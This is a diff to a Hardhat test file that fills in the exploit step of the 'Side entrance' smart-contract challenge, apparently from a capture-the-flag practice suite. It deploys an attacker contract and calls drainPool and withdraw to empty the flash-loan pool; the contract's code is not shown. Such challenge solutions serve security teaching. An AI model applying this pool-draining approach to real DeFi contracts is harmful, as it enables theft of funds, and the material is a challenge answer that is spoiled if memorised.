@@ -1,3 +1,4 @@
+
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 
@@ -24,8 +25,15 @@ describe('[Challenge] Side entrance', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
-    });
+      /** CODE YOUR EXPLOIT HERE */
+      const FlashLoanEtherReceiver = await ethers.getContractFactory('FlashLoanEtherReceiver', attacker);
+      this.receiver = await FlashLoanEtherReceiver.deploy(this.pool.address);
+      expect(
+          await ethers.provider.getBalance(this.receiver.address)
+      ).to.equal(0);
+      await this.receiver.drainPool(ETHER_IN_POOL);
+      await this.receiver.withdraw();
+  });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
